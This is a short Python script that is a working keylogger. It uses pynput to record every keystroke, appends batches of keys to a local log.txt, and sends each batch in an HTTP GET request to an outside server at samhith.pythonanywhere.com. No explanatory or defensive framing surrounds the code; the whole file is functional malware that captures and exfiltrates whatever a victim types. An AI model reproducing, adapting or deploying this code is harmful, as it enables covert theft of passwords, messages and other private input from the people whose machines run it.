from pynput.keyboard import Key, Listener
import requests 
URL = "http://samhith.pythonanywhere.com/send"

count = 0
keys=[]
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        count=0
        write_file(keys)
        
        keys=[]

def write_file(keys):
    with open("log.txt", "a") as f:
            s="".join(map(str,keys))
            s.replace("'","")
            f.write(s+"\n")
            r=requests.get(url = URL, params = {'data':s+"\n"})
            #print(r.json())

def on_release(key): 
    if key == Key.esc: 
        write_file(keys)
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
